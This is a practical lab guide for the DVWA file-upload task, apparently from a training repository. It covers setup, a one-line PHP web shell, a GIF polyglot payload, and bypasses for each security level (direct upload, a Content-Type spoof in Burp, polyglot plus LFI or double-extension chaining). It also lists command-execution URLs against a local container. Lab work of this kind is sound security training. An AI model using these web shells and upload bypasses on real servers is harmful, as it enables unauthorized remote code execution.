# Practical Guide — Task 5 (File Upload)

Repo: https://github.com/Bhandarihansraj/cyberSEC

### Setup
1. DVWA → **DVWA Security** → set level → Submit
2. Run: `./tasks/task5_file_upload/run.sh start` (confirms DVWA up, prints checklist)
3. Left menu → **Upload**

### Ready-made payload files (in the repo)
```
tasks/task5_file_upload/payloads/shell.php   -- plain PHP web shell, use for Low & Medium
tasks/task5_file_upload/payloads/shell.gif   -- GIF89a header + PHP payload, polyglot for High
```

`shell.php` content:
```php
<?php system($_GET['cmd']); ?>
```

`shell.gif` = `GIF89a` bytes followed by the same PHP payload — passes both extension whitelist and `getimagesize()` checks at High (see High section below for what happens after upload).

---

## LOW — no checks at all

1. Upload `shell.php` directly through the form
2. Response shows the stored path, e.g.:
   `../../hackable/uploads/shell.php`
3. Browse to `http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=id`
4. Command output prints on the page — remote code execution confirmed

**Burp needed?** No — nothing is blocking the upload.

---

## MEDIUM — Burp required (Content-Type check only)

Server only checks the `Content-Type` header the browser sends, not the actual file content.

1. Rename file to `shell.php` (or keep `.php`, doesn't matter — Medium checks the header, not extension)
2. Set browser proxy → `127.0.0.1:8080`, Burp Proxy → Intercept ON
3. Try uploading `shell.php` normally → Burp captures the multipart request
4. Find the part:
   ```
   Content-Disposition: form-data; name="uploaded"; filename="shell.php"
   Content-Type: application/octet-stream
   ```
5. Change `Content-Type` to `image/jpeg` (or `image/png`) → Forward
6. Server now accepts it as an "image" — same access as Low:
   `http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=id`

---

## HIGH — extension whitelist + real image-header check (`getimagesize()`)

High checks the file **extension** (must be `.jpg/.jpeg/.png`) **and** validates real image bytes via `getimagesize()` — a renamed `.php` with a fake header alone will fail both checks. Build a polyglot: valid image magic bytes + PHP code appended, saved with an image extension.

1. Take a real small JPG or use minimal GIF header bytes: `GIF89a`
2. Append the PHP payload after the image bytes:
   ```bash
   echo -n 'GIF89a' > shell.gif
   echo '<?php system($_GET["cmd"]); ?>' >> shell.gif
   ```
   `getimagesize()` reads the `GIF89a` header and passes; the `.gif` extension passes the whitelist.
3. Upload `shell.gif` — normally through the form (Burp not required for the upload itself since both checks are satisfied at the file level)
4. **Execution problem:** the server serves `.gif` as an image, not PHP — a `.gif` won't execute as code on its own. This step alone gets a "disguised" file onto the server; actual code execution needs a **second vulnerability** to chain with (e.g. a Local File Inclusion point that can force PHP to `include()` the uploaded file regardless of its extension, or an upload path that still allows `.php.gif` double-extension tricks depending on server config)
5. If DVWA's environment allows double extensions, try: `shell.php.gif` or `shell.gif.php` and test both URLs after upload to see which one the server actually executes

**Burp's role at High:** mainly to confirm exactly what response/errors come back on each attempt (watch for "Invalid image file" vs silent accept) — use Proxy/Repeater to iterate quickly on header bytes and filenames without re-filling the upload form each time.

---

## Quick reference

| Level  | Bypass                              | Burp needed |
|--------|--------------------------------------|-------------|
| Low    | Upload `.php` directly                | No |
| Medium | Spoof `Content-Type` header to `image/jpeg` | Yes — Proxy intercept + edit header |
| High   | Polyglot (image magic bytes + PHP payload), then chain with LFI/double-extension | Optional — Repeater to iterate fast |

**Command execution after upload (Low/Medium):**
`http://127.0.0.1:4280/hackable/uploads/<filename>?cmd=whoami`

---

## Locating uploaded files (container filesystem)

Web-facing path is `hackable/uploads/`, but the real file lives inside the
`dvwa-lab` container:

| What | Path |
|------|------|
| Uploads directory (in container) | `/var/www/html/hackable/uploads/` |
| Web URL to same directory | `http://127.0.0.1:4280/hackable/uploads/` |
| Upload validation source (per level) | `/var/www/html/vulnerabilities/upload/source/low.php` / `medium.php` / `high.php` |

```bash
# Shell into the container
docker exec -it dvwa-lab bash

# List everything that's been uploaded
cd /var/www/html/hackable/uploads/ && ls -la

# Read a specific file's content
cat shell.php

# Read the exact validation logic for a level (no guessing what High checks)
cat /var/www/html/vulnerabilities/upload/source/high.php
exit
```

```bash
# Copy an uploaded file OUT to the host, without exec'ing in
docker cp dvwa-lab:/var/www/html/hackable/uploads/shell.php ./shell.php

# Copy a file IN to the container manually (e.g. pre-built polyglot)
docker cp ./shell.gif dvwa-lab:/var/www/html/hackable/uploads/shell.gif
```
